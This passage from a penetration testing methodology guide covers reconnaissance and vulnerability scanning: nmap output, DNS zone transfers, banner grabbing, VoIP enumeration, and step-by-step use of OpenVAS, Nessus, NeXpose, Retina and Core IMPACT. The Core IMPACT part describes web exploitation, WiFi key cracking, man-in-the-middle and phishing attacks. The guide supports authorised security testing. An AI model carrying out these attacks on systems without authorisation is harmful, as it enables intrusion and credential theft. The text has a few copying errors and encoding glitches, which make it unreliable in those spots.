Host is up (1.0s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
554/tcp   open  rtsp
2869/tcp  open  icslap
3389/tcp  open  ms-term-serv
5000/tcp  open  upnp
5001/tcp  open  commplex-link
5002/tcp  open  rfe
5003/tcp  open  filemaker
5004/tcp  open  avt-profile-1
5357/tcp  open  wsdapi
10243/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 287.05 seconds
</pre>

<h5 id="snmp-sweeps_1">SNMP Sweeps</h5>
<p>SNMP sweeps are performed too as they offer tons of information about a specific system.  The SNMP protocol is a stateless, datagram oriented protocol.  Unfortunately SNMP servers don't respond to requests with invalid community strings and the underlying UDP protocol does not reliably report closed UDP ports.  This means that "no response" from a probed IP address can mean either of the following:</p>
<ul>
<li>Machine unreachable</li>
<li>SNMP server not running</li>
<li>invalid community string</li>
<li>the response datagram has not yet arrived</li>
</ul>
<h6 id="snmpenum-linux_1">SNMPEnum (Linux)</h6>
<p>SNMPEnum is a perl script that sends SNMP requests to a single host, then waits for the response to come back and logs them.</p>
<p>[[:File:Penetration_Testing_Execution_45.png|Screenshot Here]]</p>
<h5 id="metasploit">Metasploit</h5>
<p>Active footprinting can also be performed to a certain extent through Metasploit. Please refer to the [<a href="http://www.offensive-security.com/metasploit-unleashed/Information_Gathering">http://www.offensive-security.com/metasploit-unleashed/Information_Gathering</a> Metasploit Unleashed] course for more information on this subject. </p>
<h5 id="zone-transfers_1">Zone Transfers</h5>
<p>DNS zone transfer, also known as AXFR, is a type of DNS transaction.  It is a mechanism designed to replicate the databases containing the DNS data across a set of DNS servers. Zone transfer comes in two flavors, full (AXFR) and incremental (IXFR).  There are numerous tools available to test the ability to perform a DNS zone transfer.  Tools commonly used to perform zone transfers are host, dig and nmap.</p>
<h6 id="host_1">Host</h6>
<p><pre>host  <nowiki>&lt;</nowiki>domain<nowiki>&gt;</nowiki> <nowiki>&lt;</nowiki>DNS server<nowiki>&gt;</nowiki></pre></p>
<h6 id="dig_1">Dig</h6>
<p><pre>dig @server domain axfr</pre></p>
<h5 id="smtp-bounce-back_1">SMTP Bounce Back</h5>
<p>SMTP bounce back, also called a Non-Delivery Report/Receipt (NDR), a (failed) Delivery Status Notification (DSN) message, a Non-Delivery Notification (NDN) or simply a bounce, is an automated electronic mail message from a mail system informing the sender of another message about a delivery problem.  This can be used to assist an attacker in fingerprint the SMTP server as SMTP server information, including software and versions, may be included in a bounce message.</p>
<h5 id="reverse-dns_1">Reverse DNS</h5>
<p>Reverse DNS can be used to obtain valid server names in use within an organizational. There is a caveat that it must have a PTR (reverse) DNS record for it to resolve a name from a provided IP address.  If it does resolve then the results are returned.  This is usually performed by testing the server with various IP addresses to see if it returns any results.</p>
<h5 id="banner-grabbing_1">Banner Grabbing</h5>
<p>Banner Grabbing is an enumeration technique used to glean information about computer systems on a network and the services running its open ports.  Banner grabbing is used to identify network the version of applications and operating system that the target host are running.</p>
<p>Banner grabbing is usually performed on Hyper Text Transfer Protocol (HTTP), File Transfer Protocol (FTP), and Simple Mail Transfer Protocol (SMTP); ports 80, 21, and 25 respectively.  Tools commonly used to perform banner grabbing are Telnet, nmap, netcat and netca6 (IPv6).</p>
<h6 id="http_1">HTTP</h6>
<p><pre>JUNK / HTTP/1.0</p>
<p>HEAD / HTTP/9.3</p>
<p>OPTIONS / HTTP/1.0</p>
<p>HEAD / HTTP/1.0</pre></p>
<h6 id="httprint">httprint</h6>
<p>httprint is a web server fingerprinting tool. It relies on web server characteristics to accurately identify web servers, despite the fact that they may have been obfuscated by changing the server banner strings, or by plug-ins such as mod_security or servermask. httprint can also be used to detect web enabled devices which do not have a server banner string, such as wireless access points, routers, switches, cable modems, etc. httprint uses text signature strings and it is very easy to add signatures to the signature database.</p>
<p>[[:File:Penetration_Testing_Execution_46.png|Screenshot Here]]</p>
<h5 id="voip-mapping">VoIP mapping</h5>
<p>VoIP mapping is where we gather information about the topology, the servers and the clients. The main goal here is to find live hosts, PBX type and version, VoIP servers/gateways, clients (hardware and software) types and versions. The majority of techniques covered here assume a basic understanding of the ''Session Initiation Protocol (SIP'').  There are several tools available to help us identify and enumerate VoIP enabled devices.  SMAP is a tool which is specifically designed to scan for SIP enabled devices by generating SIP requests and awaiting responses.  SMAP usage is as follows:</p>
<p>[[:File:Penetration_Testing_Execution_47.png|Screenshot Here]]</p>
<p>SIPScan is another scanner for sip enabled devices that can scan a single host or an entire subnet.</p>
<p>[[:File:Penetration_Testing_Execution_48.png|Screenshot Here]]</p>
<h6 id="extensions">Extensions</h6>
<p>Extensions are any client application or device that initiates a SIP connection, such as an IP phone, PC softphone, PC instant messaging client, or mobile device.  The goal is to identify valid usernames or extensions of SIP devices.  Enumerating extensions is usually a product of the error messages returned using the SIP method: REGISTER, OPTIONS, or INVITE.  There are many tools that can be utilized to enumerate SIP devices.  A tool that can be used to enumerate extensions is Svwar from the SIPVicious suite.</p>
<h6 id="svwar">Svwar</h6>
<p>Svwar is also a tool from the sipvicious suite allows to enumerate extensions by using a range of extensions or using a dictionary file svwar supports all the of the three extension enumeration methods as mentioned above, the default method for enumeration is REGISTER.  Svwar usage is as follows:</p>
<p>[[:File:Penetration_Testing_Execution_49.png|Screenshot Here]]</p>
<h6 id="enumiax">enumIAX</h6>
<p>If you<nowiki>'</nowiki>ve identified an Asterisk server is in use, you need to utilize a username guessing tool such as enumIAX to enumerate Asterisk Exchange protocol usernames.  enumIAX is an Inter Asterisk Exchange version 2 (IAX2) protocol username brute-force enumerator. enumIAX may operate in two distinct modes; Sequential Username Guessing or Dictionary Attack.  enumIAX usage is as follows:</p>
<p>[[:File:Penetration_Testing_Execution_50.png|Screenshot Here]]</p>
<h5 id="passive-reconnaissance_1">Passive Reconnaissance</h5>
<h6 id="packet-sniffing">Packet Sniffing</h6>
<p>Performing packet sniffing allows for the collection IP addresses and MAC addresses from systems that have packet traffic in the stream being analyzed.  For the most part, packet sniffing is difficult to detect and so this form of recon is essentially passive and quite stealthy.  By collecting and analyzing a large number of packets it becomes possible to fingerprint the operating system and the services that are running on a given device.  It may also be possible to grab login information, password hashes, and other credentials from the packet stream.  Telnet and older versions of SNMP pass credentials in plain text and are easily compromised with sniffing.  Packet sniffing can also be useful in determining which servers act as critical infrastructure and therefore are of interest to an attacker.</p>
<h2 id="vulnerability-analysis">Vulnerability Analysis</h2>
<p>Vulnerability Analysis is used to identify and evaluate the security risks posed by identified vulnerabilities.  Vulnerability analysis work is divided into two areas: Identification and validation.  Vulnerability discovery effort is the key component of the Identification phase.  Validation is reducing the number of identified vulnerabilities to only those that are actually valid.</p>
<h3 id="vulnerability-testing">Vulnerability Testing</h3>
<p>Vulnerability Testing is divided to include both an Active and Passive method.</p>
<h4 id="active">Active</h4>
<h4 id="automated-tools">Automated Tools</h4>
<p>An automated scanner is designed to assess networks, hosts, and associated applications.  There are a number of types of automated scanners available today, some focus on particular targets or types of targets.  The core purpose of an automated scanner is the enumeration of vulnerabilities present on networks, hosts, and associated applications.</p>
<h5 id="networkgeneral-vulnerability-scanners">Network/General Vulnerability Scanners</h5>
<h5 id="open-vulnerability-assessment-system-openvas-linux">Open Vulnerability Assessment System (OpenVAS)  (Linux)</h5>
<p>The Open Vulnerability Assessment System (OpenVAS) is a framework of several services and tools offering a comprehensive and powerful vulnerability scanning and vulnerability management solution.  OpenVAS is a fork of Nessus that allows free development of a non-proprietary tool.</p>
<p>Like the earlier versions of Nessus, OpenVAS consists of a Client and Scanner.  To start the Scanner, simply run openvassd from the command line.</p>
<p>[[:File:Penetration_Testing_Execution_51.png|Screenshot Here]]</p>
<p>There are two ways in which you can run the OpenVAS Client, either the GUI or the command line interface.  Using the menu you would select on OpenVAS Client.  In the console it is "OpenVAS-Client."</p>
<p>[[:File:Penetration_Testing_Execution_52.png|Screenshot Here]]</p>
<p>Once the client starts up you will need to connect it to the scanner.</p>
<p>[[:File:Penetration_Testing_Execution_53.png|Screenshot Here]]</p>
<p>Submit in the supplied user credentials.</p>
<p>[[:File:Penetration_Testing_Execution_54.png|Screenshot Here]]</p>
<p>If you created a certificate then you supply it as well.  You will then be presented with a certificate to accept.  Click yes to continue.</p>
<p>[[:File:Penetration_Testing_Execution_55.png|Screenshot Here]]
<br>
Once you accept the certificate, OpenVAS will initialize and indicate the number of Found and Enabled plugins.  This could take a while depending upon the number of plugins that need to be downloaded.  Also, you need to ensure that you've added the appropriate /etc/hosts entries for both the IPv4 and IPv6 address.  For example:</p>
<pre>127.0.0.1       localhost

127.0.0.1       pentest

<nowiki>#</nowiki> The following lines are desirable for IPv6 capable hosts

<nowiki>:</nowiki>:1     ip6-localhost ip6-loopback pentest localhost</pre>

<p>[[:File:Penetration_Testing_Execution_56.png|Screenshot Here]]</p>
<p>Before scanning anything we need to configure the OpenVAS Scan Options.  The General section covers all the general scan options.  See Appendix A for the specific settings.  To start a new scan, you use the Scan Assistant.</p>
<p>[[:File:Penetration_Testing_Execution_57.png|Screenshot Here]]</p>
<p>Once the Scan Assistant launches, you'll have to provide some information to create the task.  First, you'll need to give the name of the task.  This is usually the name of the client or some other name that describes what you're scanning.  Once you've completed this, click Forward to continue.</p>
<p>[[:File:Penetration_Testing_Execution_58.png|Screenshot Here]]</p>
<p>A scope can be seen as a sub-task.  It defines a certain scan and the title should indicate the scope of the scan such as "Internet Facing Systems" or "Aggressive Scan of Client X".  Once you've completed this, click Forward to continue.</p>
<p>[[:File:Penetration_Testing_Execution_59.png|Screenshot Here]]</p>
<p>At this point you'll need to provide the target information.  This can be in the form of a hostname, FQDN, IP Address, Network Range, CIDR.  The only requirement is that they have to be separated with commas.  Once you've completed this, click Forward to continue.</p>
<p>[[:File:Penetration_Testing_Execution_60.png|Screenshot Here]]</p>
<p><br>Finally, we're at the point where we can launch our scan.  Click Execute to start the scan.</p>
<p>[[:File:Penetration_Testing_Execution_61.png|Screenshot Here]]</p>
<p>[[:File:Penetration_Testing_Execution_62.png|Screenshot Here]]</p>
<p>[[:File:Penetration_Testing_Execution_63.png|Screenshot Here]]</p>
<p>[[:File:Penetration_Testing_Execution_64.png|Screenshot Here]]</p>
<h5 id="nessus-windowslinux">Nessus (Windows/Linux)</h5>
<p>Nessus is a commercial automated scanning program.  It is designed to detect potential vulnerabilities on the networks, hosts, and associated application being assessed.  Nessus allows for custom policies to be utilized for specific evaluations.  For non-Web applications, the policy that should be utilized is the "Only Safe Checks" policy (See Appendix A).  For Web applications, the policy that should be utilized is the "Only Safe Checks (Web)" policy (See Appendix B).</p>
<p>To access Nessus simply enter in the correct URL into a web browser.  If you are accessing from the Pentest Lab use the following URL: https://<nowiki>&lt;</nowiki>IP ADDRESS<nowiki>&gt;</nowiki>:8834.</p>
<p><br><br>'''
[[:File:Penetration_Testing_Execution_65.png|Screenshot Here]]
'''</p>
<p>The credentials to access this will need to be established prior to attempting to access.  Once you have the logged in, you will be presented with the Reports Interface.  Prior to running any Nessus scan, the product should be validated to ensure that it has been properly updated with the latest signatures.  This process is normally run as part of a scheduled task, but you can run click on "About" which will present the Windows which contains data about the installation.<br></p>
<p>[[:File:Penetration_Testing_Execution_66.png|Screenshot Here]]</p>
<p>The Client Build ID is quick way to ensure that Nessus has been updated.  The format is as simple as YYYYMMDD.  201110223 would mean that the scanner was last updated on February, 23, 2011.</p>
<p>[[:File:Penetration_Testing_Execution_67.png|Screenshot Here]]</p>
<p>If the scanner has been updated within the last week, you can safely conduct scans.  If this date is further out than one week, you should immediately report this and avoid using the scanner until Nessus has been updated.</p>
<p>Within Nessus, there are four main tabs available: Reports, Scans, Policies, and Users.  <br>
'''
[[:File:Penetration_Testing_Execution_68.png|Screenshot Here]]
'''</p>
<p>To initiate a scan utilize the Scan tab.  This will present you with several additional options such as Add, Edit, Browse, Launch, Pause, Stop, and Delete.<br><br>
[[:File:Penetration_Testing_Execution_69.png|Screenshot Here]]</p>
<p>You will create a new scan by clicking on the "Scans" option on the menu bar at the top and then click on the "<nowiki>+</nowiki> Add" button on the right.  The "Add Scan" screen will be displayed as follows:<br>
'''
[[:File:Penetration_Testing_Execution_70.png|Screenshot Here]]
'''</p>
<p>There are five fields to enter before starting a scan.  The name field is set to the name that will be displayed to identify the scan.  The type field allows you to choose between "Run Now" and "Template."  "Run Now" executes the scan immediately after submitting.  "Template" saves the scan as a template for repeated scans.  The policy field is where the scan policy is selected.  The final two fields are both related to the scan targets.  You can either enter in the hosts (one per line) or browse for a text file containing all the target hosts.</p>
<p>Once all these fields have been properly populated click "Launch Scan" to initiate the scan process.</p>
<p><u>''Note:''</u>  Automated tools can sometimes be too aggressive by default and need to be scaled back if the customer is affected.</p>
<p>A validation scan should be conducted weekly against <nowiki>&lt;</nowiki>IP ADDRESS<nowiki>&gt;</nowiki> using the "Validation Scan" policy (See Appendix C) to ensure that Nessus is performing scans in properly.</p>
<p>[[:File:Penetration_Testing_Execution_71.png|Screenshot Here]]
<br>
If you conduct a "Validation Scan" and do not receive similar results, then you should immediately report this and void using the scanner.</p>
<p>Once the scan has completed running, it will be visible in the Reports tab.  To open the scan reports simply double-click on the appropriate completed scan file.  This will provide us with some information about the scan as well as the results.<br>
'''
[[:File:Penetration_Testing_Execution_72.png|Screenshot Here]]
'''</p>
<p>We need to save this report for us to analyze.  To do this, click on the "Download Report."  This will present a new window that allows for the format to be specified.</p>
<p>'''
[[:File:Penetration_Testing_Execution_73.png|Screenshot Here]]
'''</p>
<p>The default format is ".nessus", however it is necessary to download the Nessus results in HTML format.  This allows you to quickly review the vulnerabilities.</p>
<h5 id="nexpose">NeXpose</h5>
<p>Nessus is a commercial automated scanning product that provides vulnerability management, policy compliance and remediation management.  It is designed to detect vulnerabilities as well as policy compliance on the networks, hosts, and associated web applications.</p>
<p>To access NeXpose simply enter in the correct URL into a web browser.  If you are accessing from the Pentest Lab use the following URL: https://<nowiki>&lt;</nowiki>IP ADDRESS<nowiki>&gt;</nowiki>:3780/login.html.</p>
<p>[[:File:Penetration_Testing_Execution_74.png|Screenshot Here]]</p>
<p>The credentials to access this will need to be established prior to attempting to access.  Once you have the logged in, you will be presented with the dashboard Interface.  <br></p>
<p>[[:File:Penetration_Testing_Execution_75.png|Screenshot Here]]
<br>
Prior to running any NeXpose scan, the product should be validated to ensure that it has been properly updated with the latest signatures.  This process is normally run as part of a scheduled task, but you can quickly validate that it the scanner is up to date by simply viewing the 'News' which will give you a log file of all the updates to the scan engine as well as any updated checks.</p>
<p>[[:File:Penetration_Testing_Execution_76.png|Screenshot Here]]
<br>
If the scanner has been updated within the last week, you can safely conduct scans.  If this date is further out than one week, you should immediately report this and void using the scanner until NeXpose has been updated.</p>
<p>Within NeXpose, there are six main tabs available: Home, Assets, Tickets, Reports, Vulnerabilities, and Administration.  <br>
'''
[[:File:Penetration_Testing_Execution_77.png|Screenshot Here]]
'''</p>
<p>To initiate a scan you will have to setup a 'New Site'.  To perform this click on the 'New Site' button at the bottom of the Home Page or click on the Assets tab. <br></p>
<p>[[:File:Penetration_Testing_Execution_78.png|Screenshot Here]]</p>
<p>This will present you with the 'Site Configuration - General' page which contains several inputs such as Site name, Site importance, and Site Description.<br><br>
[[:File:Penetration_Testing_Execution_79.png|Screenshot Here]]</p>
<p>Type a name for the target site.  Then add a brief description for the site, and select a level of importance from the dropdown list.  The importance level corresponds to a risk factor that NeXpose uses to calculate a risk index for each site.  The 'Very Low' setting reduces a risk index to &#8531; of its initial value.  The 'Low' setting reduces the risk index to &#8532; of its initial value.  'High' and 'Very High' settings increase the risk index to 2x and 3x times its initial value, respectively.  A 'Normal' setting does not change the risk index.</p>
<p>'''
[[:File:Penetration_Testing_Execution_80.png|Screenshot Here]]
'''</p>
<p>Go to the ''Devices ''page to list assets for your new site.  IP addresses and/or hostnames can be manually entered in the text box labeled ''Dev''i''ces to scan''.  It is also possible to import a comma separated file that lists IP address and/or the host names of targets you want to scan.  You do have to ensure that each address/hostname in the file appears on its own line.</p>
<p>To import a target list file, click the Browse''' '''button in the '''Included Device's' ''area, and select the appropriate file.</p>
<p>If you need to exclude targets from a scan, the process is the sample however; it is performed under the area labeled '''Devices to Exclude'.''</p>
<p>Once the targets have been added, a scan template will need to be selected from the '''Scan Setup' ''page.  To select a scan template simply browse the available templates.  The scan engine drop down allows you to choose between the local scan engine and the Rapid 7 hosted scan engine.</p>
<p><br></p>
<p>[[:File:Penetration_Testing_Execution_81.png|Screenshot Here]]
<br>
There are many templates available, however be aware that if you modify a template, all sites that use that scan template will use these modified settings.  So ensure that modify an existing template with caution.</p>
<p>The default scan templates Denial of Service, Discovery scan, Discovery scan (aggressive), Exhaustive, Full audit, Internal DMZ audit, Linux RPMs, Microsoft hotfix, Payment Card Industry (PCI) audit, Penetration test, Safe network audit, Sarbanes-Oxley (SOX) compliance, SCADA audit, and Web audit.  Specific settings for these templates are included in Appendix D</p>
<p>Finally, if you wish to schedule a scan to run automatically, click the check box labeled 'Enable schedule'.  The console displays options for a start date and time, maximum scan duration in minutes, and frequency of repetition.  If the scheduled scan runs and exceeds the maximum specified duration, it will pause for an interval that you specify in the option labeled 'Repeat every'.  Select an option for what you want the scan to do after the pause interval.</p>
<p>The newly scheduled scan will appear in the 'Next Scan' column of the 'Site Summary' pane of the page for the site that you are creating.  All scheduled scans appear on the 'Calendar' page, which you can view by clicking the 'Monthly calendar' link on the 'Administration' page.</p>
<p>You can set up alerts to inform you when a scan starts, stops, fails, or matches a specific criterion.</p>
<p>From the '''Alerting; ''page and click the ''''New Alert' '''button.</p>
<p>[[:File:Penetration_Testing_Execution_82.png|Screenshot Here]]</p>
<p>The console displays a '''New Alert' ''dialog box.  Click the ''''Enable alert' '''check box to ensure that NeXpose generates this type of alert.  You can click the box again at any time to disable the alert if you prefer not to receive that alert temporarily without having to delete it.</p>
<p>[[:File:Penetration_Testing_Execution_83.png|Screenshot Here]]</p>
<p>Type a name for the alert and a value in the 'Send at most' field if you wish to limit the number of this type of alert that you receive during the scan.  Select the check boxes for types of events (Started, Stopped, Failed, Paused, and Resumed) that you wish to generate alerts for.  Select the Confirmed, Unconfirmed, and/or Potential check boxes to receive only those alerts.  Select a notification method from the dropdown box.  NeXpose can send alerts via SMTP e-mail, SNMP message, or Syslog message.  Select e-mail method and enter the addresses of your intended recipients.  Click the Limit alert text check box to send the alert without a description of the alert or its solution.  Click the Save button.  The new alert appears on the 'Alerting' page.</p>
<p>[[:File:Penetration_Testing_Execution_84.png|Screenshot Here]]</p>
<p>Establishing logon credentials enables deeper checks across a wider range of vulnerabilities, such as policy violations, adware, or spyware.  Additionally, credentialed scans result in more accurate results.  On the 'Credentials' page click 'New Login' display the 'New Login' box.</p>
<p>[[:File:Penetration_Testing_Execution_85.png|Screenshot Here]]</p>
<p>Select the desired type of credentials from the dropdown list labeled 'Login type'.  This selection determines the other fields that appear in the form.  In the appropriate field enter the appropriate user name and/or password.  The 'Restrict to Device' and 'Restrict to Port' fields allows for testing credentials to ensure that the work on a given site.  After filling those fields, click on the 'Test login' button to make sure that the credentials work.  Specifying a port in the Restrict to Port field allows you to limit your range of scanned ports in certain situations.  Click the 'Save' button.  The new credentials appear on the 'Credentials' page.</p>
<p>Once the scan has completed, you can view the results in several manners.  It is possible to view the assets by sites, view assets by groups, view assets by operating systems, view assets by services, view assets by software, and view all assets.</p>
<p>[[:File:Penetration_Testing_Execution_86.png|Screenshot Here]]</p>
<p><br>By selecting the appropriate assets view you can select the results that you wish to view.</p>
<p>[[:File:Penetration_Testing_Execution_87.png|Screenshot Here]]</p>
<p>To create a report, click on the 'Create Site Report' button.  This will take you to the 'New Report' 'Configuration' page.</p>
<p>[[:File:Penetration_Testing_Execution_88.png|Screenshot Here]]</p>
<p>Report configuration entails selecting a report template, assets to report on, and distribution options.  You may schedule automatic reports for generation and distribution after scans or on a fixed calendar timetable; or you may run reports manually.  After you go through all the following configuration steps and click 'Save', NeXpose will immediately start generating a report.</p>
<h5 id="eeye-retina">eEYE Retina</h5>
<p>eEye Retina Vulnerability Assessment Scanner is a vulnerability scanner created by eEye Digital Security that is used to correlate and validate findings from Nmap and Nessus.</p>
<p>At first glance, the interface looks to be much more complicated than Nessus.  It is however, extremely simple once you've explored it.  The initial screen that is presented is the Discovery Tasks page.  This is utilized to perform a discovery scan to determine what hosts are alive.</p>
<p>'''
[[:File:Penetration_Testing_Execution_89.png|Screenshot Here]]
'''</p>
<p>To perform a Discovery Scan, click Targets from the Actions section and the "Select Targets" option will appear.  At this point you can either enter in a single IP address or hostname that you assess.  The other options available are to scan by IP Range, CIDR, Named Host, and Address Groups.</p>
<p>Clicking on the Options Actions section presents us with additional options related to the Discovery scan.  These options include ICMP Discovery, TCP Discovery on Ports (enter in a comma separated list of port numbers, UPD Discovery, Perform OS Detection, Get Reverse DNS, Get NetBIOS Name, and  Get MAC Address.  Select the appropriate options for the scan desired.</p>
<p>'''
[[:File:Penetration_Testing_Execution_90.png|Screenshot Here]]
'''</p>
<p>To run the Discovery scan immediately click "Discover."  To run the Discovery scan at a later point in time or on a regular schedule, click "Schedule."  Retina displays your results in the Results table as it scans the selected IP(s).  In order to get the results in a format that we can use, we need to select the scan results and click "Generate" to export the results in XML format.</p>
<p>'''
[[:File:Penetration_Testing_Execution_91.png|Screenshot Here]]
'''</p>
<p>While Discovery Scans may be useful, the majority of our tasks will take place in the Audit Interface.  This is very similar to the Discovery Scan interface; however it does have a few more options.</p>
<p>'''
[[:File:Penetration_Testing_Execution_92.png|Screenshot Here]]
'''</p>
<p>The Targets section is similar though there is an additional section that allows us to specify the Output Type, Name, and Job Name.</p>
<p>'''
[[:File:Penetration_Testing_Execution_93.png|Screenshot Here]]
'''</p>
<p>This section is important to complete, as this is how the scan results will be saved.  If you do not change this information then you could potentially overwrite someone else's scan results.  By default, these are saved to the following directory:<br><br></p>
<pre>C:\Program Files\eEye Digital Security\Retina 5\Scans</pre>

<p>This is important to note, as you will need to copy these from this location to your working directory.</p>
<p>At this point we need to click Ports from the Actions section and the "Select Port Group(s)" option will appear.  At this point we need to validate that the "All Ports" option has been selected.</p>
<p>'''
[[:File:Penetration_Testing_Execution_94.png|Screenshot Here]]
'''</p>
<p>The next section we need to check is "Audits" from the Actions section and the "Select Audit Group(s)" option will appear.  At this point we need to validate that the "All Audits" option has been selected.</p>
<p>'''
[[:File:Penetration_Testing_Execution_95.png|Screenshot Here]]
'''</p>
<p>The final section we need to check is "Options" from the actions section.  Clicking on this will present us with the "Select Options" action section.</p>
<p>'''
[[:File:Penetration_Testing_Execution_96.png|Screenshot Here]]
'''</p>
<p>At this point we need to validate that the following option has been selected:</p>
<ul>
<li>Perform OS Detection</li>
<li>Get Reverse DNS</li>
<li>Get NetBIOS Name</li>
<li>Get MAC Address</li>
<li>Perform Traceroute</li>
<li>Enable Connect Scan</li>
<li>Enable Force Scan</li>
<li>Randomize Target List</li>
<li>Enumerate Registry via NetBIOS</li>
<li>Enumerate Users via NetBIOS</li>
<li>Enumerate Shares via NetBIOS</li>
<li>Enumerate Files via NetBIOS</li>
<li>Enumerate Hotfixes via NetBIOS.</li>
<li>Enumerate Named Pipes via NetBIOS</li>
<li>Enumerate Machine Information via NetBIOS</li>
<li>Enumerate Audit Policy via NetBIOS</li>
<li>Enumerate Per-User Registry Settings via NetBIOS</li>
<li>Enumerate Groups via NetBIOS</li>
<li>Enumerate Processes via NetBIOS</li>
<li>Enumerate a maximum of 100 users</li>
</ul>
<p>At this point we are ready to actually perform the Audit Scan.  Click the Scan button to start the Audit Scan immediately.  To perform the scan at a later point in time or on a regular schedule, click "Schedule."</p>
<p>'''
[[:File:Penetration_Testing_Execution_97.png|Screenshot Here]]
'''</p>
<p><u>''Note:''</u>  Automated tools can sometimes be too aggressive by default and need to be scaled back if the customer is affected.</p>
<p>The results of your scan are automatically saved in .rtd format.</p>
<p>Retina displays your results in the Results table as it scans the selected IP(s).  </p>
<p>'''
[[:File:Penetration_Testing_Execution_98.png|Screenshot Here]]
'''</p>
<h5 id="qualys">Qualys</h5>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></p>
<h5 id="core-impact">Core IMPACT</h5>
<p>Core IMPACT is a penetration testing and exploitation toolset used for testing the effectiveness of your information security program. Core IMPACT automates several difficult exploits and has a multitude of exploits and post exploitation capabilities.</p>
<h6 id="core-impact-web">Core IMPACT Web</h6>
<p>Core can exploit SQL injection, Remote File Inclusion and Reflected Cross Site Scripting flaws on vulnerable web applications.</p>
<p>'''
[[:File:coreWEBrpt.jpg|Screenshot Here]]
'''</p>
<p>1) Information Gathering.
As always, the first step information gathering. Core organizes web attacks into scenarios. You can create multiple scenarios and test the same application with varying settings, segment a web application, or to separate multiple applications. 
a) Select the target, either by providing a url or telling Core to choose web servers discovered during the network RPT
b) Choose a method for exploring the site, automatic or interactive. </p>
<p>With automatic crawling, select the browser agent, max pages and depth, whether it should follow links to other/or to include other domains, whether it should run test to determine the server/application framework, whether to evaluate javascript, check robots.txt for links, and how it should handle forms. For greater customization, you can also select a link parsing module and set session parameters.</p>
<p>'''
[[:File:coreWEBcrawl.jpg|Screenshot Here]]
'''</p>
<p>With interactive, you set your îbrowserî to use Core as a proxy and then navigate through the web application.
Further customized discovery modules like checking for backup and hidden pages are available on the modules tab.</p>
<p>'''
[[:File:corerptmodules.jpg|Screenshot Here]]
'''</p>
<p>2) Web Attack and penetration.</p>
<p>The attack can be directed to a scenario or individual pages. Each type of exploit has its own configuration wizard.
SQL Injection tests can be performed on request parameters and/or request cookies. There are three different levels of injection attacks
FAST: quickly runs the most common tests, NORMAL: runs the tests that are in the FAST plus some additional tests FULL: runs all tests (for details on what the difference tests check for, select the modules tab, navigate to the Exploits | SQL Injection section and view the contents of the SQL Injection Analyzer paying attention to the fuzz_strings). Adding information about known custom error pages and any session arguments will enhance testing.
For XSS attacks, configure the browser XSS should be tested for, whether or not to evaluate POST parameters and whether to look for Persistent XSS vulnerabilities.
For PHP remote file injection vulnerabilities, the configuration is either yes try to exploit or no, donít.
Monitor the module progress in the Executed Modules pane. If the WebApps Attack and Penetration is successful, then Core Agents (see note on agents in Core network RPT) will appear under vulnerable pages in the Entity View.</p>
<p>3) Web Apps Browser attack.</p>
<p>Can leverage XSS exploits to assist with Social Engineering awareness tests. The wizard will guide the penetration tester though the process of leveraging the XSS vulnerability to your list of recipients from the client side information gathering phase. </p>
<p>4) Web App Local Information Gathering.</p>
<p>Will check for sensitive information, get database logins and get the database schema for pages where SQL was successfully exploited. Command and SQL shells may also be possible. </p>
<p>'''
[[:File:coreWEBagendeployed.jpg|Screenshot Here]]
'''</p>
<p>The RFI agent(PHP) can be used to gather information, for shell access, or to install the full Core Agent. </p>
<p>5) Report Generation.
Select from a variety of reports like executive, vulnerability and activity reports.</p>
<p>Core Onestep Web RPTs
Core also has two one-step rapid penetration tests
1) WebApps Vulnerability Test
Type in the web application and Core will attempt to locate pages that contain vulnerabilities to SQL Injection, PHP Remote File Inclusion, or Cross-site Scripting attacks. This test can also be scheduled. 
2) WebApps Vulnerability Scanner Validator</p>
<p>Core will try to confirm vulnerabilities from IBM Rational AppScan, HP WebInspect, or NTOspider scans.</p>
<h6 id="core-impact-wifi">Core IMPACT WiFi</h6>
<p>Core Impact contains a number of modules for penetration testing an 802.11 wireless network and/or the security of wireless clients. 
In order to use the wireless modules you must use an AirPcap adapter available from <a href="http://www.cacetech.com">www.cacetech.com</a>.</p>
<p>'''
[[:File:corewireless.jpg|Screenshot Here]]
'''</p>
<p>1) Information Gathering.
Select the channels to scan to discover access points or capture wireless packets.</p>
<p>2) Wireless Denial of Service
The station deauth module can be used to demonstrate wireless network disruption. It is also used to gather information for encryption key cracking.</p>
<p>3) Crack Encryption Keys.
Attempt to discover and crack WEP and WPA/WPA2 PSK encryption keys. For WPA/WPA2, relevant passwords files from recognizance phase should be used.</p>
<p>4) Man in the Middle client attacks.
Allows penetration tester to sniff wireless traffic, intercept or manipulate requests to gain access to sensitive data or an end user system. 
Leverage existing wireless network from steps one and two, or setup fake access points with the Karma Attack.</p>
<p>5) Reporting.
Reports about all the discovered WiFi networks , summary information about attacks while using a Fake Access Point and results of Man In The Middle (MiTM) attacks can be generated.</p>
<h6 id="core-impact-client-side">Core IMPACT Client Side</h6>
<p>Core Impact can perform controlled and targeted social engineering attacks against a specified user community via email, web browsers, third-party plug-ins, and other client-side applications.</p>
<p>'''
[[:File:coreCSrpt.jpg|Screenshot Here]]
'''</p>
<p>1) As always, the first step information gathering.  Core Impact has automate modules for scraping email addresses our of search engines (can utilize search API keys), PGP, DNS and WHOIS records, LinkedIn as well as by crawling a website, contents and metadata for Microsoft Office Documents and PDFs , or importing from a text file generated using  source as documented in the intelligence gather section of the PTES.
2) With the target list complete, the next step is to create the attack. Core supports multiple types of attacks, including single exploit, multiple exploits or a phishing only attack</p>
<p>'''
[[:File:coreCSattacktype.jpg|Screenshot Here]]
'''
'''
[[:File:coreCSsingle.jpg|Screenshot Here]]
'''
'''
[[:File:coreCSmulti.jpg|Screenshot Here]]
'''
'''
[[:File:coreCSphish.jpg|Screenshot Here]]
'''</p>
<p>Depending on which option is chosen the wizard will walk you through choosing the exploit, setting  the duration of the client side test, and choosing an email template (note: predefined templates are available, but message should be customized to match target environment!) .Web links can be obfuscated using  tinyURL, Bit.Ly or Is.gd.<br />
After setting the options for the email server the Core Agent connect back method (HTTP,  HTTPS, or other port), and choosing whether or not to run a module on successful exploitation or to try to collect smb credentials, the attack will start. 
Specific modules can be run instead of using the wizard by choosing the modules tab</p>
<p>'''
[[:File:corerptormodules.jpg|Screenshot Here]]
'''</p>
